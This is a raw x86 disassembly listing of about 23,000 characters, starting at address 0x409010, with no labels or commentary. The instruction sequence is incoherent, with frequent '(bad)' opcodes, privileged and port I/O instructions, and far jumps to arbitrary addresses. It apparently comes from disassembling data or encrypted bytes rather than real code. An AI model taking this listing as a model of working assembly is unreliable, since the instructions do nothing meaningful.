  409010:	sbb    eax,0x8abe2fcb
  409015:	fstp   QWORD PTR [ecx+eax*1+0x2a04999b]
  40901c:	sub    al,0x9a
  40901e:	and    ch,BYTE PTR [edx+0x3a39ef62]
  409024:	sahf   
  409025:	into   
  409026:	fwait
  409027:	clc    
  409028:	mov    ch,0xcb
  40902a:	aas    
  40902b:	add    edx,DWORD PTR [ebp+0x4f]
  40902e:	pop    edx
  40902f:	test   BYTE PTR [ecx-0x22],0x48
  409033:	imul   ecx,DWORD PTR [edx-0x7bdddfde],0xa2074f7
  40903d:	xchg   BYTE PTR [ebp-0x2c],al
  409040:	push   edi
  409041:	dec    esp
  409042:	adc    bh,BYTE PTR [ebx+esi*1-0x3539462d]
  409049:	addr16 out 0x70,al
  40904c:	dec    edx
  40904d:	fs dec edi
  40904f:	ror    ecx,1
  409051:	outs   dx,BYTE PTR ds:[esi]
  409052:	push   0xffffff83
  409054:	sahf   
  409055:	pop    edx
  409056:	ror    edi,0xa5
  409059:	(bad)  
  40905a:	pusha  
  40905b:	mov    edi,0x5a71f2b0
  409060:	dec    esi
  409061:	enter  0x750b,0xe5
  409065:	jp     0x4090df
  409067:	sbb    DWORD PTR [edi+ebx*1-0x552dc591],ebp
  40906e:	cdq    
  40906f:	or     BYTE PTR [edi+0x283b5d92],bh
  409075:	mov    bl,0x14
  409077:	rol    BYTE PTR [ebx+0x49],cl
  40907a:	lods   al,BYTE PTR ds:[esi]
  40907b:	and    eax,0xf8a9825d
  409080:	out    0x39,al
  409082:	dec    ecx
  409083:	mov    DWORD PTR [edi-0x3d],ecx
  409086:	retf   0xcb8e
  409089:	inc    edx
  40908a:	(bad)  
  40908b:	xor    eax,0x5db45b8e
  409090:	push   eax
  409091:	loop   0x4090d0
  409093:	push   0x4e
  409095:	imul   ecx,DWORD PTR [eax-0x61],0x50160e1c
  40909c:	cwde   
  40909d:	dec    esi
  40909e:	xchg   esi,eax
  40909f:	(bad)  
  4090a0:	xor    eax,ecx
  4090a2:	adc    esp,0xffffff82
  4090a5:	dec    edi
  4090a6:	fldenv [ebx]
  4090a8:	sbb    eax,0x98fbb72b
  4090ad:	call   DWORD PTR [ebx-0x10]
  4090b0:	call   eax
  4090b2:	mov    al,0x60
  4090b4:	imul   DWORD PTR ds:0xbf2fdc4c
  4090ba:	in     al,dx
  4090bb:	lahf   
  4090bc:	xchg   edx,eax
  4090bd:	call   0x52eb:0x69c09f73
  4090c4:	adc    bh,ch
  4090c6:	push   es
  4090c7:	hlt    
  4090c8:	ret    0x67c8
  4090cb:	lea    ebp,[edi+0x4e]
  4090ce:	fimul  WORD PTR [edx-0x3dac73fe]
  4090d4:	xchg   BYTE PTR [ecx],bl
  4090d6:	data16 lods al,BYTE PTR ds:[esi]
  4090d8:	sub    al,0xc0
  4090da:	ins    BYTE PTR es:[edi],dx
  4090db:	jp     0x40911f
  4090dd:	lods   eax,DWORD PTR ds:[esi]
  4090de:	mov    bh,BYTE PTR [ebp-0x29d53c70]
  4090e4:	ds aad 0xef
  4090e7:	ins    BYTE PTR es:[edi],dx
  4090e8:	xchg   BYTE PTR [edi],ah
  4090ea:	xor    esp,DWORD PTR [ebx-0x7e]
  4090ed:	fild   WORD PTR [ebp+0x71513ef]
  4090f3:	inc    edi
  4090f4:	cmc    
  4090f5:	xchg   esp,eax
  4090f6:	jae    0x4090c6
  4090f8:	jl     0x4090b0
  4090fa:	pushf  
  4090fb:	rcr    dl,0x36
  4090fe:	xchg   ebx,eax
  4090ff:	and    BYTE PTR [ebp-0x39ef6077],ch
  409105:	jg     0x40915e
  409107:	dec    ebx
  409108:	mov    bh,0x1e
  40910a:	test   DWORD PTR [eax],eax
  40910c:	push   ss
  40910d:	xchg   edx,eax
  40910e:	bound  ecx,QWORD PTR [ecx+0x4f]
  409111:	lea    ecx,ds:[edi+eiz*1+0x78c605e2]
  409119:	mov    al,0xf6
  40911b:	adc    eax,0x38a54377
  409120:	jmp    0xa6a6:0x522a8a61
  409127:	icebp  
  409128:	popa   
  409129:	pop    es
  40912a:	add    BYTE PTR [ebx],ch
  40912c:	and    bl,dh
  40912e:	loope  0x4090c3
  409130:	stos   DWORD PTR es:[edi],eax
  409131:	aas    
  409132:	add    DWORD PTR [ebp+0x51],esp
  409135:	fdivr  st(5),st
  409137:	int3   
  409138:	sbb    eax,0xc7596493
  40913d:	fcomi  st,st(6)
  40913f:	loopne 0x4090eb
  409141:	mov    WORD PTR [esi-0x38a353a],?
  409147:	adc    al,BYTE PTR [eax]
  409149:	repnz test al,0x2a
  40914c:	sub    eax,0xafd2bde9
  409151:	and    dl,bl
  409153:	push   edi
  409154:	jnp    0x409146
  409156:	ins    BYTE PTR es:[edi],dx
  409157:	add    ebp,edx
  409159:	fbld   TBYTE PTR [eax+0xc446081]
  40915f:	mov    bh,0x5a
  409161:	ret    
  409162:	lea    edi,[eax+0x79]
  409165:	outs   dx,DWORD PTR ds:[esi]
  409166:	mov    al,0xe
  409168:	push   ds
  409169:	jecxz  0x4091d6
  40916b:	xor    edi,ecx
  40916d:	(bad)  
  40916e:	or     DWORD PTR [ebx-0x55],esi
  409171:	sub    eax,0x943194b3
  409176:	push   eax
  409177:	mov    al,0xbf
  409179:	(bad)
  40917c:	pop    eax
  40917d:	push   cs
  40917e:	imul   edx,DWORD PTR [edx-0x26],0x5e2354dc
  409185:	not    cl
  409187:	mov    dh,0x9b
  409189:	(bad)  
  40918a:	fild   DWORD PTR [edx]
  40918c:	cli    
  40918d:	add    bl,BYTE PTR [eax+0x7ec4f277]
  409193:	mov    bh,0xae
  409195:	mov    dh,0xf4
  409197:	jle    0x4091b3
  409199:	inc    esi
  40919a:	mov    BYTE PTR [ebx],ch
  40919c:	iret   
  40919d:	mov    BYTE PTR [esi-0x46b3f0fa],al
  4091a3:	das    
  4091a4:	sbb    ch,BYTE PTR [eax]
  4091a6:	and    al,0xf3
  4091a8:	xor    edi,DWORD PTR [ebx]
  4091aa:	or     esi,ebp
  4091ac:	and    eax,0x80cb2897
  4091b1:	cld    
  4091b2:	mov    ?,WORD PTR [ebx-0x21]
  4091b5:	in     eax,dx
  4091b6:	inc    ebp
  4091b7:	inc    esp
  4091b8:	mov    DWORD PTR [esi-0x7b69bf11],eax
  4091be:	sbb    al,0x36
  4091c0:	mov    ecx,DWORD PTR [edi+0x6dc93ec7]
  4091c6:	or     cl,BYTE PTR [edx]
  4091c8:	jmp    0xbc8fcb19
  4091cd:	sysenter 
  4091cf:	aad    0x50
  4091d1:	sti    
  4091d2:	aas    
  4091d3:	sar    DWORD PTR [eax-0x53],cl
  4091d6:	adc    DWORD PTR [ebx-0x7b],eax
  4091d9:	(bad)  
  4091da:	cmp    cl,dh
  4091dc:	adc    al,0x6c
  4091de:	and    BYTE PTR [ecx],dh
  4091e0:	call   0x34a93d2a
  4091e5:	das    
  4091e6:	xlat   BYTE PTR ds:[ebx]
  4091e7:	aam    0xd0
  4091e9:	fsub   DWORD PTR [edi-0x26]
  4091ec:	add    eax,DWORD PTR [ebx+0x3b30cd82]
  4091f2:	cmp    ebx,DWORD PTR [edi-0x73]
  4091f5:	dec    edx
  4091f6:	or     DWORD PTR [edx],ebx
  4091f8:	int3   
  4091f9:	test   al,0xe7
  4091fb:	mov    BYTE PTR [eax],bh
  4091fd:	cmp    ch,BYTE PTR [ebx]
  4091ff:	jle    0x4091a8
  409201:	jl     0x409259
  409203:	fimul  DWORD PTR [ecx-0x19]
  409206:	stos   DWORD PTR es:[edi],eax
  409207:	mov    bh,0x6a
  409209:	fnstcw WORD PTR [esi-0x7a]
  40920c:	imul   ebp,ebp,0xe0313b62
  409212:	adc    eax,0xffa3ce87
  409217:	push   0x531979cc
  40921c:	mov    eax,0xab7cb246
  409221:	or     esp,DWORD PTR [eax-0x6]
  409224:	inc    ecx
  409225:	(bad)  
  409226:	fidivr WORD PTR [edi+0x30]
  409229:	outs   dx,BYTE PTR ds:[esi]
  40922a:	cmp    al,0x8e
  40922c:	pusha  
  40922d:	xchg   DWORD PTR [esi+0x33],eax
  409230:	aad    0xbc
  409232:	loop   0x4092ad
  409234:	xor    eax,0xd29da1ef
  409239:	in     eax,dx
  40923a:	push   edi
  40923b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40923d:	or     eax,0x16c9890
  409242:	sbb    ch,BYTE PTR [eax+ebp*4+0x265bb42a]
  409249:	shl    BYTE PTR [edx-0x7f],1
  40924c:	leave  
  40924d:	lods   eax,DWORD PTR ds:[esi]
  40924e:	adc    ebp,ecx
  409250:	sub    al,0x8b
  409253:	mov    WORD PTR [eax-0x55],dx
  409257:	jno    0x40920a
  409259:	sti    
  40925a:	pop    ds
  40925b:	sbb    bl,BYTE PTR [ecx]
  40925d:	add    esi,ebp
  40925f:	(bad)  
  409260:	jp     0x409262
  409262:	or     esp,ebp
  409264:	sahf   
  409265:	dec    ebp
  409266:	pushf  
  409267:	gs out 0x20,eax
  40926a:	pop    ss
  40926b:	cmc    
  40926c:	imul   edi,DWORD PTR [ebx+ebx*1-0x1d],0x9ff24654
  409274:	sbb    ecx,ebx
  409276:	mov    bl,0x56
  409278:	mov    esi,0x10e1fb7f
  40927d:	push   ecx
  40927e:	pop    edi
  40927f:	imul   ebp,DWORD PTR [edx-0x50],0xffffffa4
  409283:	repnz shl BYTE PTR [ebx+0x67],cl
  409287:	dec    ebx
  409288:	(bad)  
  409289:	adc    BYTE PTR [ebx-0x25],bl
  40928c:	iret   
  40928d:	and    al,0x5a
  40928f:	in     eax,0xe0
  409291:	or     BYTE PTR [esi],al
  409293:	pop    esi
  409294:	xchg   edi,eax
  409295:	(bad)  
  409296:	call   0xf741d59f
  40929b:	(bad)  
  40929c:	dec    ah
  40929e:	xchg   ah,ah
  4092a0:	ss cmp ax,0x8a2d
  4092a5:	mov    esi,0x96e28092
  4092aa:	or     eax,0xa9bd837e
  4092af:	fidiv  WORD PTR [eax]
  4092b1:	adc    eax,0x54557c75
  4092b6:	mov    esi,0x67e10a9e
  4092bb:	shl    DWORD PTR [esi],1
  4092bd:	push   esi
  4092be:	and    DWORD PTR [esi-0x4bfa9985],ebx
  4092c4:	sub    BYTE PTR [edx+0x45],dl
  4092c7:	div    DWORD PTR [ecx]
  4092c9:	sbb    DWORD PTR [ecx-0x6b],edx
  4092cc:	dec    ebx
  4092cd:	in     eax,0x54
  4092cf:	stos   DWORD PTR es:[edi],eax
  4092d0:	lahf   
  4092d1:	shr    cl,1
  4092d3:	and    DWORD PTR ss:[ecx+0x5a142c18],edi
  4092da:	jne    0x4092c6
  4092dc:	jmp    FWORD PTR [edi]
  4092de:	cmp    edx,ecx
  4092e0:	setp   BYTE PTR [ecx-0x69]
  4092e4:	fcomp  DWORD PTR [edx+0x11]
  4092e7:	jnp    0x409272
  4092e9:	dec    ecx
  4092ea:	out    dx,eax
  4092eb:	into   
  4092ec:	scas   al,BYTE PTR es:[edi]
  4092ed:	pop    es
  4092ee:	cmp    dh,al
  4092f0:	fwait
  4092f1:	mov    eax,0x17f28d4e
  4092f6:	fsub   DWORD PTR ds:0x1f2aa9ca
  4092fc:	aad    0x76
  4092fe:	fisub  DWORD PTR [ebx]
  409300:	jbe    0x409306
  409302:	retf   0xfc5a
  409305:	jno    0x409347
  409307:	daa    
  409308:	mov    es,WORD PTR [ecx+ecx*1+0x76]
  40930c:	cdq    
  40930d:	cmp    eax,0xd67c46f1
  409312:	aaa    
  409313:	push   0x43
  409315:	int    0xbd
  409317:	ja     0x4092d3
  409319:	adc    al,0xb5
  40931b:	mov    esp,0x1a7a2e80
  409320:	sbb    BYTE PTR [eax],bh
  409322:	jecxz  0x409301
  409324:	inc    edi
  409325:	ins    DWORD PTR es:[edi],dx
  409326:	push   edx
  409327:	mov    dl,0xd7
  409329:	add    dl,BYTE PTR [edi+0xcd62308]
  40932f:	jnp    0x40930f
  409331:	add    eax,0x40e039ff
  409336:	arpl   bx,cx
  409338:	(bad)  
  409339:	imul   esi,DWORD PTR [edx+0x66def300],0x73
  409340:	arpl   WORD PTR [ecx],cx
  409342:	fwait
  409343:	or     bl,BYTE PTR [ecx+eax*8+0x455702a]
  40934a:	push   es
  40934b:	pusha  
  40934c:	scas   al,BYTE PTR es:[edi]
  40934d:	dec    edi
  40934e:	fbld   TBYTE PTR [edi]
  409350:	fucomp st(7)
  409352:	mov    esi,0x7114dae3
  409357:	or     DWORD PTR [edx-0x7a4a302a],eax
  40935d:	and    BYTE PTR [esi],al
  40935f:	into   
  409360:	mov    eax,ds:0x8b8b17f7
  409365:	pop    esi
  409366:	test   al,0x46
  409368:	out    dx,eax
  409369:	xor    DWORD PTR [esi+eiz*1-0x9],esi
  40936d:	ja     0x4093d8
  40936f:	cs addr16 add al,0x2d
  409373:	fld    DWORD PTR [eax]
  409375:	nop
  409376:	jecxz  0x409357
  409378:	inc    ebp
  409379:	cld    
  40937a:	inc    esi
  40937b:	xchg   edi,eax
  40937c:	inc    esi
  40937d:	jnp    0x4093d3
  40937f:	xchg   ecx,eax
  409380:	jl     0x4093cd
  409382:	xor    eax,DWORD PTR [edi+0xf362600]
  409388:	sub    BYTE PTR ds:0xaa0d3650,ch
  40938e:	xchg   ebp,ebx
  409390:	out    dx,al
  409391:	inc    ecx
  409392:	or     al,0x1b
  409394:	or     esi,eax
  409396:	add    ah,BYTE PTR [eax+0x293865b6]
  40939c:	rol    DWORD PTR [edx-0x7e],cl
  40939f:	pop    esi
  4093a0:	loope  0x4093ee
  4093a2:	adc    DWORD PTR [ebx+0x1480728d],eax
  4093a8:	jnp    0x4093ce
  4093aa:	fld    TBYTE PTR [edx-0x6f]
  4093ad:	pop    ss
  4093ae:	sbb    al,0x25
  4093b0:	and    dh,ah
  4093b2:	mov    ah,0xc0
  4093b4:	je     0x409351
  4093b6:	(bad)  
  4093b7:	iret   
  4093b8:	ins    DWORD PTR es:[edi],dx
  4093b9:	rol    BYTE PTR [ecx+esi*8],1
  4093bc:	mov    eax,ds:0x609eba3b
  4093c1:	push   ebx
  4093c2:	or     DWORD PTR [esi+0x2f],0xc8994197
  4093c9:	sub    BYTE PTR [ebp-0x54e52c11],ah
  4093cf:	(bad)  
  4093d0:	push   ecx
  4093d1:	inc    ebx
  4093d2:	lea    ecx,ds:0x435ed404
  4093d8:	shl    DWORD PTR [ebx-0x203124dc],0x16
  4093df:	clc    
  4093e0:	in     eax,dx
  4093e1:	int3   
  4093e2:	dec    eax
  4093e3:	push   edi
  4093e4:	xchg   ecx,eax
  4093e5:	pop    esp
  4093e6:	loop   0x4093a1
  4093e8:	push   edi
  4093e9:	inc    ebp
  4093ea:	(bad)  
  4093eb:	jp     0x40945c
  4093ed:	mov    ecx,0x4f3f03e8
  4093f2:	add    ebp,DWORD PTR [edx-0x54eda163]
  4093f8:	mov    dh,0x47
  4093fa:	pop    eax
  4093fb:	outs   dx,BYTE PTR ds:[esi]
  4093fc:	pushf  
  4093fd:	sbb    esi,DWORD PTR ds:0x67a59d3d
  409403:	cli    
  409404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409405:	adc    al,0x60
  409407:	pop    ecx
  409408:	fsubr  QWORD PTR [eax]
  40940a:	mov    dh,0xa4
  40940c:	clc    
  40940d:	clc    
  40940e:	push   edi
  40940f:	mov    ds:0xaf77155e,eax
  409414:	mov    ecx,0x94411ed4
  409419:	push   ebx
  40941a:	loopne 0x409414
  40941c:	mov    bh,0xec
  40941e:	cmp    eax,0x39ed3938
  409423:	pop    ecx
  409424:	adc    eax,0x7ce7fbc4
  409429:	mul    DWORD PTR [ebx]
  40942b:	pop    esi
  40942c:	outs   dx,BYTE PTR ds:[esi]
  40942d:	sub    DWORD PTR [ebx+edi*1],eax
  409430:	mov    esp,0x6c8f719a
  409435:	les    edx,FWORD PTR [ecx+0x64]
  409438:	and    BYTE PTR [ecx+0x2040f220],ah
  40943e:	(bad)  
  40943f:	cmp    ch,BYTE PTR [esi-0x6e717b0f]
  409445:	adc    ecx,ecx
  409447:	sbb    ecx,DWORD PTR [eax+ebx*8+0x7c6c8bae]
  40944e:	xchg   ebx,eax
  40944f:	mov    esp,0x38a3e6b9
  409454:	cwde   
  409455:	fwait
  409456:	and    al,BYTE PTR [eax]
  409458:	jp     0x4094ad
  40945a:	add    DWORD PTR [ebx],esp
  40945c:	adc    bh,BYTE PTR [ecx]
  40945e:	(bad)  
  409460:	mov    WORD PTR [ecx-0x17ca52e7],fs
  409466:	daa    
  409467:	cmp    BYTE PTR [edi],dl
  409469:	dec    esi
  40946a:	mov    ss,WORD PTR [esi+ecx*8]
  40946d:	cmc    
  40946e:	add    al,0xa4
  409470:	jbe    0x4093f3
  409472:	or     DWORD PTR [ebx],eax
  409474:	push   ds
  409475:	or     dl,bl
  409477:	fst    QWORD PTR [ecx+esi*8+0x37222731]
  40947e:	mov    dl,0xac
  409480:	ja     0x4094f0
  409482:	outs   dx,BYTE PTR ds:[esi]
  409483:	jae    0x40949e
  409485:	fs pop ds
  409487:	and    esp,DWORD PTR [edx]
  409489:	push   esp
  40948a:	call   0x50490359
  40948f:	sub    DWORD PTR [eax-0x352e91d3],ecx
  409495:	adc    BYTE PTR [eax],ch
  409497:	aas    
  409498:	fnsave [eiz*1-0x37df4bf]
  40949f:	int3   
  4094a0:	inc    ecx
  4094a1:	pop    eax
  4094a2:	sahf   
  4094a3:	mov    bh,0x1b
  4094a5:	imul   esi,esp,0xffffffc8
  4094a8:	rcl    BYTE PTR [esi+0x50474fea],cl
  4094ae:	mov    ebx,0x56404545
  4094b3:	(bad)  
  4094b4:	sbb    al,0x5f
  4094b6:	xchg   edx,eax
  4094b7:	stos   DWORD PTR es:[edi],eax
  4094b8:	mov    edx,0xc8b033b6
  4094bd:	in     eax,0xb1
  4094bf:	cdq    
  4094c0:	aaa    
  4094c1:	sub    al,0xed
  4094c3:	xor    al,0x37
  4094c5:	adc    eax,0x12b6fb24
  4094ca:	hlt    
  4094cb:	mov    DWORD PTR [ebp+0x6d],edx
  4094ce:	pop    ss
  4094cf:	test   BYTE PTR [eax-0x73],bh
  4094d2:	cmc    
  4094d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094d4:	rol    BYTE PTR [ebp-0x3a],1
  4094d7:	std    
  4094d8:	lods   al,BYTE PTR ds:[esi]
  4094d9:	lahf   
  4094da:	pop    ecx
  4094db:	retf   0x94a9
  4094de:	in     al,dx
  4094df:	dec    eax
  4094e0:	imul   ebp,DWORD PTR [eax-0x399b5a56],0x2d
  4094e7:	add    esp,0xffffffe7
  4094ea:	idiv   al
  4094ec:	pushf  
  4094ed:	out    dx,eax
  4094ee:	repnz xchg edx,eax
  4094f0:	mov    cs,WORD PTR [ebp+0x692ed811]
  4094f6:	xchg   edi,eax
  4094f7:	jns    0x4094ff
  4094f9:	adc    DWORD PTR [ebp-0x18],edx
  4094fc:	xchg   esi,eax
  4094fd:	leave  
  4094fe:	call   0x84653fb8
  409503:	pop    ss
  409504:	fs ret 
  409506:	xor    al,0x9f
  409508:	mov    cl,0x22
  40950a:	inc    esi
  40950b:	sbb    bl,BYTE PTR [edx-0x5a8fe8bb]
  409511:	sti    
  409512:	mov    ah,0xaa
  409514:	clc    
  409515:	sbb    edx,esi
  409517:	aas    
  409518:	push   edi
  409519:	mov    edi,0xcd9f3818
  40951e:	mov    edx,0x76e5c4e7
  409523:	pop    esp
  409524:	mov    dh,0x78
  409526:	mov    ebx,0xdb9be13
  40952b:	in     eax,dx
  40952c:	dec    esp
  40952d:	xor    al,0xce
  40952f:	xchg   ebx,eax
  409530:	or     DWORD PTR [edx+0x19],ebp
  409533:	das    
  409534:	out    0x8a,al
  409536:	in     eax,dx
  409537:	xor    BYTE PTR [eax+ebx*8+0x6b],bh
  40953b:	ds fcmovne st,st(0)
  40953e:	das    
  40953f:	sbb    bl,BYTE PTR [ebp+0x393dc645]
  409545:	or     esi,DWORD PTR [ebx]
  409547:	lds    edx,FWORD PTR ds:0xd2bff146
  40954d:	mov    DWORD PTR [edx],edx
  40954f:	cli    
  409550:	sti    
  409551:	adc    eax,0x65d13d2f
  409556:	fnsave [ecx]
  409558:	fwait
  409559:	xor    eax,0xc4b4f0af
  40955e:	or     dl,al
  409560:	retf   0x13ae
  409563:	bound  ebp,QWORD PTR [edi-0x45e18418]
  409569:	pop    ecx
  40956a:	or     eax,0x4a1f0bbf
  40956f:	mov    bh,0xc5
  409571:	ins    DWORD PTR es:[edi],dx
  409572:	hlt    
  409573:	and    BYTE PTR [edx-0x61],al
  409576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409577:	fild   WORD PTR [edi-0x36a89890]
  40957d:	push   0x7e6e006f
  409582:	fwait
  409583:	aad    0xc8
  409585:	add    eax,0x1c25a6e
  40958a:	add    eax,DWORD PTR [eax+0x4f8cf256]
  409590:	add    eax,0xd7826e57
  409595:	jbe    0x409613
  409597:	mov    eax,ds:0xf14bac74
  40959c:	pop    ss
  40959d:	cdq    
  40959e:	dec    eax
  40959f:	pushf  
  4095a0:	lods   al,BYTE PTR ds:[esi]
  4095a1:	xor    BYTE PTR [ebx-0x71],bl
  4095a4:	dec    esp
  4095a5:	int    0xfe
  4095a7:	les    eax,FWORD PTR cs:[esi+edx*1-0x43]
  4095ac:	mov    edi,0xe79fe7c7
  4095b1:	adc    cl,BYTE PTR [ecx]
  4095b3:	mov    ah,0xf5
  4095b5:	test   DWORD PTR [edx+edi*8],ecx
  4095b8:	mov    al,0x1f
  4095ba:	fcomp  QWORD PTR [ebp-0x20]
  4095bd:	int    0xa1
  4095bf:	xor    BYTE PTR [ecx+0x26c33623],bh
  4095c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095c6:	mov    esi,0x33adbf3f
  4095cb:	pop    edi
  4095cc:	in     al,dx
  4095cd:	adc    al,0x48
  4095cf:	jmp    0x7db8:0x474773ba
  4095d6:	outs   dx,DWORD PTR ds:[esi]
  4095d7:	inc    edi
  4095d8:	jle    0x40961a
  4095da:	rcr    DWORD PTR [eax],cl
  4095dc:	sbb    edi,DWORD PTR [ebx+0x4d]
  4095df:	or     ebp,DWORD PTR [ecx+0x58]
  4095e2:	pop    esi
  4095e3:	xchg   ecx,eax
  4095e4:	iret   
  4095e5:	repz xor BYTE PTR [eax],0x8a
  4095e9:	dec    ebx
  4095ea:	push   es
  4095eb:	xchg   esi,ecx
  4095ed:	stc    
  4095ee:	les    edx,FWORD PTR [edi]
  4095f0:	int    0x7
  4095f2:	out    0xba,al
  4095f4:	pop    eax
  4095f5:	mov    ah,0x7a
  4095f7:	jbe    0x40964a
  4095f9:	inc    ecx
  4095fa:	cdq    
  4095fb:	push   edi
  4095fc:	movaps xmm7,XMMWORD PTR [ebx+eiz*2+0x3fb9a5ce]
  409604:	sub    esi,DWORD PTR [eax+0x34656985]
  40960a:	mov    al,0x53
  40960c:	add    bh,cl
  40960e:	jns    0x409608
  409610:	push   0xe4b074ca
  409615:	lods   al,BYTE PTR ds:[esi]
  409616:	(bad)  
  409617:	mov    dh,0x2c
  409619:	into   
  40961a:	pop    esp
  40961b:	mov    al,0x54
  40961d:	ins    BYTE PTR es:[edi],dx
  40961e:	test   DWORD PTR [ecx+esi*8-0x428305d3],ebp
  409625:	popa   
  409626:	sub    eax,0xba3ad65a
  40962b:	ret    
  40962c:	fistp  WORD PTR [esp+ecx*2+0x6e]
  409630:	cmc    
  409631:	pop    esp
  409632:	(bad)  
  409633:	push   ebp
  409634:	add    al,0xfc
  409636:	cmp    ecx,DWORD PTR fs:[eax]
  409639:	mov    bh,0xf1
  40963b:	add    esi,esi
  40963d:	sub    eax,DWORD PTR [eax]
  40963f:	pop    ebx
  409640:	or     ebp,edi
  409642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409643:	inc    edx
  409644:	jbe    0x409643
  409646:	pop    ds
  409647:	add    ch,0xdb
  40964a:	xchg   ebx,eax
  40964b:	jmp    0xee54:0xb4657631
  409652:	(bad)  
  409653:	imul   ebx,eax,0xffffffd5
  409656:	mov    cl,0x3d
  409658:	mov    dl,BYTE PTR [edx+0x3]
  40965b:	fidivr WORD PTR [eax+0x60]
  40965e:	sbb    eax,0xc3155e2
  409663:	lods   al,BYTE PTR ds:[esi]
  409664:	mov    esp,ecx
  409666:	neg    cl
  409668:	ins    BYTE PTR es:[edi],dx
  409669:	call   0x7f8e9593
  40966e:	aas    
  40966f:	mov    al,ds:0x1acfafc
  409674:	push   cs
  409675:	aas    
  409676:	lock inc si
  409679:	jle    0x4096be
  40967b:	push   esp
  40967c:	out    0x80,al
  40967e:	dec    ebx
  40967f:	jle    0x40969a
  409681:	xor    BYTE PTR [edx],al
  409683:	inc    esp
  409684:	lds    esi,FWORD PTR [edi-0x7c0e4d11]
  40968a:	ss jbe 0x40965b
  40968d:	adc    DWORD PTR [edi+0x11cb3946],0xaf263bf5
  409697:	xor    BYTE PTR ds:0x4fd17b48,cl
  40969d:	ins    BYTE PTR es:[edi],dx
  40969e:	xchg   ebx,eax
  40969f:	cdq    
  4096a0:	fcom   DWORD PTR [edx-0x649d56d4]
  4096a6:	cdq    
  4096a7:	dec    edx
  4096a8:	jns    0x409704
  4096aa:	push   ebp
  4096ab:	sub    dh,ch
  4096ad:	xlat   BYTE PTR ds:[ebx]
  4096ae:	nop
  4096af:	push   ds
  4096b0:	and    edi,DWORD PTR [edi]
  4096b2:	shr    BYTE PTR [esi+0x7e],0xbe
  4096b6:	xchg   ch,cl
  4096b8:	sub    edi,DWORD PTR [eiz*4-0x45c41162]
  4096bf:	or     eax,0x2614dcc7
  4096c4:	in     al,0x71
  4096c6:	jno    0x4096c5
  4096c8:	test   al,0xbd
  4096ca:	rcl    BYTE PTR [ebx],1
  4096cc:	lods   al,BYTE PTR ds:[esi]
  4096cd:	rol    BYTE PTR [ebp-0x80],0x35
  4096d1:	xchg   edi,eax
  4096d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096d3:	pop    es
  4096d4:	pushf  
  4096d5:	call   0x4ea703a5
  4096da:	mov    al,0x95
  4096dc:	(bad)  
  4096dd:	cmp    al,0x20
  4096df:	shr    al,0xb4
  4096e2:	xchg   BYTE PTR [ebp+0x64],cl
  4096e5:	outs   dx,DWORD PTR ds:[esi]
  4096e6:	ins    BYTE PTR es:[edi],dx
  4096e7:	mov    DWORD PTR [esi+0x1fe2b31e],edx
  4096ed:	cmc    
  4096ee:	in     eax,0xdd
  4096f0:	sbb    edx,DWORD PTR [edx-0xc]
  4096f3:	in     al,dx
  4096f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096f5:	fcmovne st,st(5)
  4096f7:	sahf   
  4096f8:	imul   ebx,DWORD PTR [esi+0x62],0x52
  4096fc:	adc    BYTE PTR [esi+0x6],cl
  4096ff:	push   edi
  409700:	sbb    DWORD PTR [eax+0x30],esi
  409703:	jb     0x409699
  409705:	ret    0xdbbc
  409708:	cmc    
  409709:	(bad)  
  40970a:	mov    al,ds:0xcabed7d2
  40970f:	jl     0x4096cd
  409711:	and    eax,0x72136d59
  409716:	mov    bl,dl
  409718:	inc    ecx
  409719:	xor    esi,DWORD PTR [eax-0x1397077f]
  40971f:	push   esi
  409720:	jns    0x409703
  409722:	push   esp
  409723:	cmp    dl,BYTE PTR [esi]
  409725:	lods   eax,DWORD PTR ds:[esi]
  409726:	inc    esp
  409727:	mov    eax,0x93c2e58
  40972c:	jmp    0x6c96:0x955675b0
  409733:	adc    eax,0xf6a0706b
  409738:	xchg   esp,eax
  409739:	das    
  40973a:	mov    DWORD PTR [ebp+0x72],0xc63a9877
  409741:	xor    bh,ch
  409743:	call   0x13b2:0xf04e39f2
  40974a:	or     DWORD PTR [eax],esi
  40974c:	or     DWORD PTR ds:0x6a0d426c,eax
  409752:	imul   edx,DWORD PTR [eax-0x4d6ef53d],0xf523f3e1
  40975c:	mov    esi,0xe07268bc
  409761:	push   ecx
  409762:	shr    BYTE PTR [ecx-0x42],0x6a
  409766:	and    edx,esp
  409768:	mov    dh,0xfe
  40976a:	fstp   st(2)
  40976c:	or     BYTE PTR [ebx-0x19],0x54
  409770:	dec    edi
  409771:	call   0x81a3:0x126f87a2
  409778:	mov    ds:0x1372e170,eax
  40977d:	test   al,0xfa
  40977f:	mov    edi,0x66ab296f
  409784:	call   FWORD PTR [eax-0x72a4a848]
  40978a:	mov    ebp,0x624ee3ab
  40978f:	jmp    0x40978c
  409791:	inc    esp
  409792:	ins    BYTE PTR es:[edi],dx
  409793:	(bad)  
  409794:	sub    ecx,DWORD PTR [edx-0x439a6928]
  40979a:	and    BYTE PTR [ebx-0x54b6d2a8],bl
  4097a0:	ds dec eax
  4097a2:	ret    0x5175
  4097a5:	outs   dx,BYTE PTR ds:[esi]
  4097a6:	scas   al,BYTE PTR es:[edi]
  4097a7:	and    DWORD PTR [edi+eax*1+0x484c3674],edx
  4097ae:	icebp  
  4097af:	xor    eax,0x41cfda54
  4097b4:	fdiv   QWORD PTR [ebx+0x734f84a1]
  4097ba:	ja     0x4097c3
  4097bc:	loope  0x409745
  4097be:	cli    
  4097bf:	adc    ebx,DWORD PTR [ebx+0x30]
  4097c2:	pop    edi
  4097c3:	in     al,dx
  4097c4:	mov    dh,0x17
  4097c6:	rcr    BYTE PTR [ebp+0x2f51f0b4],0x8e
  4097cd:	outs   dx,BYTE PTR ds:[esi]
  4097ce:	push   eax
  4097cf:	push   ecx
  4097d0:	rcr    al,1
  4097d2:	mov    BYTE PTR gs:[ebx-0x181cf0f],bh
  4097d9:	or     eax,0x70b2ce36
  4097de:	mov    BYTE PTR [eax],bl
  4097e0:	mov    BYTE PTR [edi-0x1],cl
  4097e3:	aaa    
  4097e4:	mov    dl,0x9
  4097e6:	and    al,0x80
